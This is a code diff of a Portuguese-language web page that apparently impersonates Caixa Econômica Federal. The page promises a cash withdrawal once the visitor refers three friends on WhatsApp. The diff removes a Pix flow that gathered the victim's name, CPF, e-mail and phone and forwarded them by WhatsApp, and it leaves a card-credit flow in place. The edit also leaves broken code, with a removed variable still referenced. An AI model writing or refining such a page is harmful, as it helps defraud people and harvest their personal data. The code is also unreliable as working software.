@@ -528,9 +528,7 @@
             </div>
 
             <div class="mt-3">
-              <button id="btnSaquePix" class="btn btn-modal-primary w-100 mb-2" disabled style="background: #004aad; color: white;">
-                <i class="fas fa-pix me-2"></i>Sacar via Pix
-              </button>
+              
               <button id="btnSaqueCartao" class="btn btn-modal-primary w-100" disabled style="background: #1a7f2e; color: white;">
                 <i class="fas fa-credit-card me-2"></i>Credito no Cartão
               </button>
@@ -541,29 +539,7 @@
             </div>
           </div>
 
-          <!-- MODAL PIX -->
-          <div id="flowPix" class="flow-step">
-            <div class="text-center mb-3">
-              <i class="fas fa-pix fa-3x" style="color:var(--caixa-blue);"></i>
-              <h5>Saque via Pix</h5>
-            </div>
-            <div class="mb-3">
-              <label class="form-label">E-mail</label>
-              <input type="email" id="emailPix" class="form-control" placeholder="seu@email.com">
-            </div>
-            <div class="mb-3">
-              <label class="form-label">Telefone (WhatsApp)</label>
-              <input type="tel" id="telefonePix" class="form-control" placeholder="(11) 99999-9999">
-            </div>
-            <div class="value-card mb-3" style="padding: 15px;">
-              <div class="label">VALOR A RECEBER</div>
-              <div class="amount" style="font-size: 28px;">R$ <span id="pixValor">0,00</span></div>
-            </div>
-            <div class="d-flex gap-2">
-              <button id="cancelPix" class="btn btn-modal-secondary flex-grow-1">Cancelar</button>
-              <button id="confirmPix" class="btn btn-modal-primary flex-grow-1">Enviar Solicitação</button>
-            </div>
-          </div>
+          
 
           <!-- MODAL CARTÃO -->
           <div id="flowCartao" class="flow-step">
@@ -868,9 +844,9 @@
                 }
             }
         }
-        const btnPix = document.getElementById('btnSaquePix');
+        
         const btnCartao = document.getElementById('btnSaqueCartao');
-        if (btnPix && btnCartao) {
+        if (btnCartao && btnCartao) {
             btnPix.disabled = !saqueLiberado;
             btnCartao.disabled = !saqueLiberado;
         }
@@ -879,7 +855,7 @@
             document.getElementById('valorDisponivel').textContent = formatarMoeda(valor);
             document.getElementById('finalNome').textContent = dadosUsuario.nome;
             document.getElementById('finalCpf').textContent = cpfAtual ? formatarCPFDisplay(cpfAtual) : '--';
-            document.getElementById('pixValor').textContent = formatarMoeda(valor);
+            
             document.getElementById('cartaoValor').textContent = formatarMoeda(valor);
             document.getElementById('dataCredito').textContent = getDataMaisDias(3);
         }
@@ -945,7 +921,7 @@
     }
 
     function showStep(stepId, stepNumber) {
-        const steps = ['flowStep1', 'flowLoading', 'flowStep2', 'flowFinal', 'flowPix', 'flowCartao', 'flowSuccess'];
+        const steps = ['flowStep1', 'flowLoading', 'flowStep2', 'flowFinal', 'flowCartao', 'flowSuccess'];
         steps.forEach(id => {
             const el = document.getElementById(id);
             if (el) el.classList.remove('active');
@@ -985,7 +961,7 @@
                     document.getElementById('valorDisponivel').textContent = formatarMoeda(valor);
                     document.getElementById('finalNome').textContent = dadosUsuario.nome;
                     document.getElementById('finalCpf').textContent = formatarCPFDisplay(cpfAtual);
-                    document.getElementById('pixValor').textContent = formatarMoeda(valor);
+                   
                     document.getElementById('cartaoValor').textContent = formatarMoeda(valor);
                     document.getElementById('dataCredito').textContent = getDataMaisDias(3);
                     
@@ -1013,7 +989,7 @@
     function verificarLiberacaoSaque() {
         if (amigosIndicados >= 3) {
             saqueLiberado = true;
-            document.getElementById('btnSaquePix').disabled = false;
+           
             document.getElementById('btnSaqueCartao').disabled = false;
         }
     }
@@ -1137,29 +1113,7 @@
             }
         });
 
-        document.getElementById('btnSaquePix').addEventListener('click', () => {
-            if (!saqueLiberado) {
-                alert('Você precisa indicar 3 amigos no WhatsApp para liberar o saque!');
-                return;
-            }
-            showStep('flowPix', 3);
-        });
-
-        document.getElementById('confirmPix').addEventListener('click', () => {
-            const email = document.getElementById('emailPix').value;
-            const telefone = document.getElementById('telefonePix').value;
-            if (!email || !telefone) {
-                alert('Por favor, preencha todos os campos.');
-                return;
-            }
-            const valor = dadosUsuario?.valorDisponivel || 1987.48;
-            const mensagem = `🆕 *NOVA SOLICITAÇÃO DE SAQUE - PIX* 🆕\n\n👤 *Beneficiário:* ${dadosUsuario?.nome || 'N/A'}\n🆔 *CPF:* ${cpfAtual ? formatarCPFDisplay(cpfAtual) : 'N/A'}\n📧 *E-mail:* ${email}\n📱 *Telefone:* ${telefone}\n💰 *Valor:* R$ ${formatarMoeda(valor)}\n🏦 *Banco:* CAIXA ECONÔMICA FEDERAL\n📅 *Data:* ${new Date().toLocaleString('pt-BR')}\n✅ *Solicitação via Pix*`;
-            enviarWhatsApp(mensagem);
-            alert('✅ Solicitação enviada com sucesso!');
-            limparProgresso();
-            showStep('flowSuccess', 3);
-        });
-
+    
         document.getElementById('btnSaqueCartao').addEventListener('click', () => {
             if (!saqueLiberado) {
                 alert('Você precisa indicar 3 amigos no WhatsApp para liberar o saque!');
